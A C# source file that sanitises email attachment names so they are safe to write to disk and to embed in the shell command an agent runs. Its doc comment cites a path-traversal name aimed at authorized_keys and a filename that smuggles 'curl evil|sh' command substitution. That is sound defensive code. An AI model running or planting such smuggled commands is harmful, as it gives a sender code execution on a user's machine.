using System.Text;

namespace OutPost2.Core.Files;

/// <summary>
/// Turns an attachment's name — chosen by whoever sent the mail — into one that is safe to
/// write to disk and safe to put inside a shell command (OP2-265).
/// <para>
/// Both matter because <c>save_attachment</c> hands back a command the agent runs on the
/// user's own machine. A name like <c>../../.ssh/authorized_keys</c> is a path traversal,
/// and one like <c>$(curl evil|sh).pdf</c> is code execution, and the sender wrote both.
/// So this is an allowlist, not a blocklist: letters, digits and a few punctuation marks
/// survive, and everything else becomes an underscore. The result never contains a quote,
/// a separator, a <c>$</c> or a backtick, and so is inert inside single quotes in sh, bash
/// and PowerShell alike.
/// </para>
/// </summary>
public static class SafeFileName
{
    public const int MaxLength = 150;

    private static readonly HashSet<string> WindowsReserved = new(StringComparer.OrdinalIgnoreCase)
    {
        "CON", "PRN", "AUX", "NUL",
        "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
        "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
    };

    public static string From(string? name)
    {
        var raw = name ?? "";

        // Only the last segment, whichever separator the sender used.
        var cut = raw.LastIndexOfAny(['/', '\\']);
        if (cut >= 0) raw = raw[(cut + 1)..];

        var sb = new StringBuilder(raw.Length);
        foreach (var ch in raw.Normalize(NormalizationForm.FormC))
            sb.Append(Allowed(ch) ? ch : '_');

        var safe = sb.ToString();

        // No hidden files, no "..", nothing that reads as an option to a command; and no
        // trailing dot or space, which Windows silently strips and so turns into a
        // different name from the one that was reported.
        safe = safe.TrimStart('.', ' ', '-').TrimEnd('.', ' ');
        while (safe.Contains("__")) safe = safe.Replace("__", "_");

        if (safe.Length == 0 || safe.Trim('_').Length == 0) safe = "attachment";

        var stem = safe.Split('.')[0];
        if (WindowsReserved.Contains(stem)) safe = "_" + safe;

        if (safe.Length > MaxLength)
        {
            // The extension is kept, shortened if it has to be, never dropped. Dropping it
            // meant a 400-character name ending ".verylongextensionname" was saved with no
            // extension at all, so the file opened with the wrong application — which for a
            // tool whose whole purpose is preserving the original is the wrong trade.
            var ext = Path.GetExtension(safe);
            if (ext.Length > 21) ext = ext[..21];

            safe = safe[..(MaxLength - ext.Length)].TrimEnd('.', ' ') + ext;
        }

        return safe;
    }

    /// <summary>
    /// Safe names for a whole message's attachments, made distinct. Two attachments called
    /// <c>image001.png</c> are common, and the second must not overwrite the first.
    /// Compared case-insensitively because the disk it lands on may be.
    /// </summary>
    public static IReadOnlyList<string> Distinct(IEnumerable<string?> names)
    {
        var taken = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var result = new List<string>();

        foreach (var n in names)
        {
            var safe = From(n);
            var candidate = safe;
            var i = 2;
            while (!taken.Add(candidate))
            {
                var ext = Path.GetExtension(safe);
                candidate = $"{safe[..^ext.Length]} ({i++}){ext}";
            }
            result.Add(candidate);
        }

        return result;
    }

    private static bool Allowed(char ch) =>
        char.IsLetterOrDigit(ch) || ch is ' ' or '.' or '-' or '_' or '+' or ',' or '@' or '=' or '(' or ')';
}
